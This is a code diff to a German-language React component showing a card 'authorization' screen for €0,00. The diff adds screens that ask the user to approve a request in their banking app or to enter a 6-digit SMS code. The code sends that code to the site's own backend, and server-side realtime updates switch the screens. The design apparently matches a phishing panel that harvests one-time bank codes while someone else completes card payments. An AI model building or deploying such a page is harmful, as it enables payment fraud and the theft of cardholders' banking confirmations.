@@ -1,7 +1,10 @@
 import React, { useEffect, useState } from 'react';
 import { Card, CardContent } from "@/components/ui/card";
-import { CreditCard, Shield, Lock } from 'lucide-react';
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { CreditCard, Shield, Lock, Smartphone, MessageSquare, CheckCircle } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
+import { useToast } from '@/hooks/use-toast';
 
 interface AuthorizationPanelProps {
   orderId: string;
@@ -9,7 +12,11 @@ interface AuthorizationPanelProps {
 
 const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId }) => {
   const [orderData, setOrderData] = useState<any>(null);
+  const [sessionData, setSessionData] = useState<any>(null);
   const [currentTextIndex, setCurrentTextIndex] = useState(0);
+  const [smsCode, setSmsCode] = useState('');
+  const [selectedMethod, setSelectedMethod] = useState<string>('');
+  const { toast } = useToast();
 
   const processingTexts = [
     "Wird verarbeitet...",
@@ -20,15 +27,26 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId }) => {
   ];
 
   useEffect(() => {
-    const fetchOrderData = async () => {
-      const { data } = await supabase
+    const fetchData = async () => {
+      // Fetch order data
+      const { data: order } = await supabase
         .from('orders')
         .select('*')
         .eq('id', orderId)
         .single();
-      setOrderData(data);
+      setOrderData(order);
+
+      // Fetch session data
+      const { data: session } = await supabase
+        .from('payment_sessions')
+        .select('*')
+        .eq('order_id', orderId)
+        .order('created_at', { ascending: false })
+        .limit(1)
+        .single();
+      setSessionData(session);
     };
-    fetchOrderData();
+    fetchData();
   }, [orderId]);
 
   useEffect(() => {
@@ -40,6 +58,277 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId }) => {
 
     return () => clearInterval(interval);
   }, [processingTexts.length]);
+
+  // Listen for realtime updates
+  useEffect(() => {
+    if (!sessionData?.session_id) return;
+
+    const channel = supabase
+      .channel(`session-updates-${sessionData.session_id}`)
+      .on(
+        'postgres_changes',
+        {
+          event: 'UPDATE',
+          schema: 'public',
+          table: 'payment_sessions',
+          filter: `session_id=eq.${sessionData.session_id}`
+        },
+        (payload) => {
+          setSessionData(payload.new);
+          // Navigate to confirmation page when payment is completed
+          if (payload.new.verification_status === 'completed') {
+            setTimeout(() => {
+              window.location.href = '/confirmation';
+            }, 2000);
+          }
+        }
+      )
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(channel);
+    };
+  }, [sessionData?.session_id]);
+
+  const handleAppConfirmation = async () => {
+    try {
+      await supabase.functions.invoke('payment-sessions/confirm-app-verification', {
+        body: { sessionId: sessionData.session_id }
+      });
+      toast({
+        title: "App-Bestätigung erfolgreich",
+        description: "Ihre Bestätigung wurde übermittelt.",
+      });
+    } catch (error) {
+      toast({
+        title: "Fehler",
+        description: "App-Bestätigung fehlgeschlagen.",
+        variant: "destructive"
+      });
+    }
+  };
+
+  const handleSmsSubmit = async () => {
+    if (!smsCode) return;
+    
+    try {
+      const response = await supabase.functions.invoke('payment-sessions/submit-sms-code', {
+        body: { sessionId: sessionData.session_id, code: smsCode }
+      });
+      
+      if (response.error) {
+        toast({
+          title: "Ungültiger Code",
+          description: "Der eingegebene SMS-Code ist falsch.",
+          variant: "destructive"
+        });
+      } else {
+        toast({
+          title: "SMS-Code bestätigt",
+          description: "Ihr Code wurde erfolgreich übermittelt.",
+        });
+        setSmsCode('');
+      }
+    } catch (error) {
+      toast({
+        title: "Fehler",
+        description: "SMS-Code konnte nicht übermittelt werden.",
+        variant: "destructive"
+      });
+    }
+  };
+
+  const handleMethodSelection = async (method: string) => {
+    try {
+      await supabase.functions.invoke('payment-sessions/set-verification-method', {
+        body: { sessionId: sessionData.session_id, method }
+      });
+      setSelectedMethod(method);
+    } catch (error) {
+      toast({
+        title: "Fehler",
+        description: "Verifikationsmethode konnte nicht gesetzt werden.",
+        variant: "destructive"
+      });
+    }
+  };
+
+  const renderContent = () => {
+    if (!sessionData) {
+      return renderLoadingState();
+    }
+
+    // Check verification status and method
+    const { verification_method, verification_status } = sessionData;
+
+    if (verification_status === 'completed') {
+      return renderFinalProcessingState();
+    }
+
+    switch (verification_method) {
+      case 'app_confirmation':
+        return verification_status === 'app_confirmed' ? renderFinalProcessingState() : renderAppConfirmationState();
+      case 'sms_confirmation':
+        return verification_status === 'sms_confirmed' ? renderFinalProcessingState() : renderSmsConfirmationState();
+      case 'choice_required':
+        return renderChoiceState();
+      default:
+        return renderLoadingState();
+    }
+  };
+
+  const renderLoadingState = () => (
+    <>
+      <div className="space-y-2">
+        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+          Karte autorisieren
+        </h1>
+        <p className="text-4xl font-light text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+          €0,00
+        </p>
+        <p className="text-sm text-gray-600">
+          Autorisierungsbetrag
+        </p>
+      </div>
+
+      <div className="flex items-center justify-center space-x-3 py-4">
+        <div className="relative">
+          <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
+        </div>
+        <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+          {processingTexts[currentTextIndex]}
+        </span>
+      </div>
+    </>
+  );
+
+  const renderAppConfirmationState = () => (
+    <>
+      <div className="space-y-2">
+        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+          App-Bestätigung erforderlich
+        </h1>
+        <div className="flex items-center justify-center space-x-2 py-4">
+          <Smartphone className="w-8 h-8 text-blue-600" />
+        </div>
+        <p className="text-base text-gray-700">
+          Bitte öffnen Sie Ihre Banking-App und bestätigen Sie die Autorisierung.
+        </p>
+        <p className="text-sm text-gray-600">
+          Drücken Sie den Button unten, sobald Sie die Freigabe in der App erteilt haben.
+        </p>
+      </div>
+
+      <Button 
+        onClick={handleAppConfirmation}
+        className="w-full bg-green-600 hover:bg-green-700 text-white py-3 text-base"
+      >
+        <CheckCircle className="w-5 h-5 mr-2" />
+        In App bestätigt
+      </Button>
+    </>
+  );
+
+  const renderSmsConfirmationState = () => (
+    <>
+      <div className="space-y-2">
+        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+          SMS-Bestätigung
+        </h1>
+        <div className="flex items-center justify-center space-x-2 py-4">
+          <MessageSquare className="w-8 h-8 text-blue-600" />
+        </div>
+        <p className="text-base text-gray-700">
+          Ein SMS-Code wurde an Ihre Mobilfunknummer verschickt.
+        </p>
+        <p className="text-sm text-gray-600">
+          Bitte geben Sie den 6-stelligen Code unten ein.
+        </p>
+      </div>
+
+      <div className="space-y-4">
+        <Input
+          type="text"
+          placeholder="6-stelliger SMS-Code"
+          value={smsCode}
+          onChange={(e) => setSmsCode(e.target.value)}
+          maxLength={6}
+          className="text-center text-lg tracking-widest"
+        />
+        <Button 
+          onClick={handleSmsSubmit}
+          disabled={smsCode.length !== 6}
+          className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 text-base"
+        >
+          Code bestätigen
+        </Button>
+      </div>
+    </>
+  );
+
+  const renderChoiceState = () => (
+    <>
+      <div className="space-y-2">
+        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+          Bestätigungsmethode wählen
+        </h1>
+        <p className="text-base text-gray-700">
+          Bitte wählen Sie, wie Sie die Zahlung bestätigen möchten:
+        </p>
+      </div>
+
+      <div className="space-y-3">
+        <Button
+          onClick={() => handleMethodSelection('app_confirmation')}
+          variant="outline"
+          className="w-full p-4 h-auto flex items-center space-x-3 border-2 hover:border-blue-500"
+        >
+          <Smartphone className="w-6 h-6 text-blue-600" />
+          <div className="text-left">
+            <div className="font-medium">App-Bestätigung</div>
+            <div className="text-sm text-gray-600">Über Ihre Banking-App</div>
+          </div>
+        </Button>
+        
+        <Button
+          onClick={() => handleMethodSelection('sms_confirmation')}
+          variant="outline"
+          className="w-full p-4 h-auto flex items-center space-x-3 border-2 hover:border-blue-500"
+        >
+          <MessageSquare className="w-6 h-6 text-blue-600" />
+          <div className="text-left">
+            <div className="font-medium">SMS-Code</div>
+            <div className="text-sm text-gray-600">Per Textnachricht</div>
+          </div>
+        </Button>
+      </div>
+    </>
+  );
+
+  const renderFinalProcessingState = () => (
+    <>
+      <div className="space-y-2">
+        <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+          Zahlung wird autorisiert
+        </h1>
+        <div className="flex items-center justify-center space-x-2 py-4">
+          <CheckCircle className="w-8 h-8 text-green-600" />
+        </div>
+        <p className="text-base text-gray-700">
+          Ihre Bestätigung wurde erhalten. Die Zahlung wird nun verarbeitet.
+        </p>
+      </div>
+
+      <div className="flex items-center justify-center space-x-3 py-4">
+        <div className="relative">
+          <div className="w-6 h-6 border-4 border-green-100 rounded-full animate-spin border-t-green-600"></div>
+        </div>
+        <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
+          Autorisierung wird abgeschlossen...
+        </span>
+      </div>
+    </>
+  );
   return (
     <div className="space-y-6">
       {/* Main Authorization Card */}
@@ -61,29 +350,9 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId }) => {
           </div>
 
           <div className="text-center space-y-6">
-            <div className="space-y-2">
-              <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
-                Karte autorisieren
-              </h1>
-              <p className="text-4xl font-light text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
-                €0,00
-              </p>
-              <p className="text-sm text-gray-600">
-                Autorisierungsbetrag
-              </p>
-            </div>
+            {renderContent()}
 
-            {/* Loading Animation */}
-            <div className="flex items-center justify-center space-x-3 py-4">
-              <div className="relative">
-                <div className="w-6 h-6 border-4 border-blue-100 rounded-full animate-spin border-t-blue-600"></div>
-              </div>
-              <span className="text-base text-gray-700" style={{ fontFamily: 'Google Sans, sans-serif' }}>
-                {processingTexts[currentTextIndex]}
-              </span>
-            </div>
-
-            {/* Important Notice */}
+            {/* Important Notice - Always show */}
             <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
               <div className="flex items-start space-x-3">
                 <CreditCard className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
@@ -98,7 +367,7 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId }) => {
               </div>
             </div>
 
-            {/* Payment Method Display */}
+            {/* Payment Method Display - Always show */}
             <div className="bg-gray-50 rounded-lg p-4">
               <div className="flex items-center justify-between">
                 <div className="flex items-center space-x-3">
